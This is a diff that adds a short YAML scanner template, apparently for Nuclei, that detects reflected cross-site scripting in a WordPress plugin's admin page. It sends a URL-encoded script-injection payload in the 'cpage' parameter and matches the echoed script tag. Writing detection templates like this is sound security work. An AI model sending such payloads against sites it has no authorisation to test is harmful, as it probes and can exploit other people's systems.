@@ -1,0 +1,16 @@
+id: wp-admin-xss
+info:
+  name: XSS in WP-Admin
+  author: pdteam
+  severity: high
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/wp-admin/admin.php?page=etmbu-all-posts&s=yes&markdone=no&cpage=%22%3E%3Cscript%3Ealert(%2FXSS%2F)%3C%2Fscript%3E"
+      
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(/XSS/)</script>"
+        part: body
